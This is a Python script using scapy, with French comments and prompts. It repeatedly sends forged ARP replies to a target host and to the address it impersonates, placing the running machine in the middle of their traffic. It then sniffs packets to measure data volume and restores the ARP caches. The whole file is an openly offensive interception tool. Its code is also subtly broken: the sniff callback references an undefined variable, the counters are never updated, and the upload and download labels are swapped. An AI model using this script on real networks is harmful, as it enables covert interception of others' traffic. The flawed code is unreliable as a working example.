import time
from scapy.all import ARP, getmacbyip, send, sniff
from scapy.error import Scapy_Exception

def capture(packet, target_ip, spoof_ip, data_volume_incoming, data_volume_outgoing):
    # on vérifie si une couche IP existe
    if packet.haslayer("IP"):
        ip_src = packet["IP"].src
        ip_dst = packet["IP"].dst
        
        # machine cible vers la passerelle
        if ip_src == target_ip and ip_dst == spoof_ip:
            data_volume_outgoing += len(packet)
            
        # passerelle vers la machine cible
        elif ip_src == spoof_ip and ip_dst == target_ip:
            data_volume_incoming += len(packet)

def perform_arp_spoofing(target_ip, spoof_ip):
    try:
        target_mac = getmacbyip(target_ip)
        spoof_mac = getmacbyip(spoof_ip)
        
        packet_arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet_arp, verbose=False)
    except Scapy_Exception as e:
        print(f"Une erreur provenant de Scapy est survenue : {e}")

def restore(target_ip, spoof_ip):
    try:
        target_mac = getmacbyip(target_ip)
        spoof_mac = getmacbyip(spoof_ip)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac), verbose=False)
    except Scapy_Exception as e:
        print(f"Une erreur provenant de Scapy est survenue : {e}")

def main():
    try:
        target_ip = input("Entrez l'adresse IP à écouter : ")
        spoof_ip = input("Quelle adresse IP à usurper : ")
        
        data_volume_incoming = 0
        data_volume_outgoing = 0

        while True:
            perform_arp_spoofing(target_ip, spoof_ip)
            perform_arp_spoofing(spoof_ip, target_ip)
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("Capture en cours du trafic")
        sniff(timeout=5, iface="Wi-Fi", prn=capture(packet, target_ip, spoof_ip, data_volume_incoming, data_volume_outgoing))
        print(f"Volume de données montant : {data_volume_incoming} octets")
        print(f"Volume de données descendant : {data_volume_outgoing} octets")
        
        print("Rétablissement du cache ARP")
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)

if __name__ == "__main__":
    main()
